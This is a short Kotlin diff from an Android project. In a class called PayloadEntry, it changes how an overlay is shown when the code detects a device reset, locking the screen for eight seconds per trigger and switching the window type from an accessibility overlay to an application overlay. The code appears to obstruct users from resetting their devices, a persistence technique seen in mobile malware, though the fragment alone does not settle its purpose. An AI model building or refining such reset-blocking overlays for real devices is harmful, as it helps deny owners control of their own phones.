@@ -71,9 +71,12 @@ class PayloadEntry : DynamicEntry {
                     lockUntil = now + 8000 // Keep it locked for 8 seconds per trigger
                     if (activeScenario != 2) {
                         activeScenario = 2
-                        DynamicEntry.log("🚨 RESET DETECTED. Locking overlay.")
+                        DynamicEntry.log("🚨 RESET DETECTED. Using Universal Contained Overlay.")
+                        
+                        // Switching to TYPE_APPLICATION_OVERLAY (The 'Appear on Top' Variation)
+                        // This automatically sits BELOW the status bar / notification shade
                         DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
-                            type = android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                            type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                             flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                         )
                         DynamicEntry.overlayContent = {
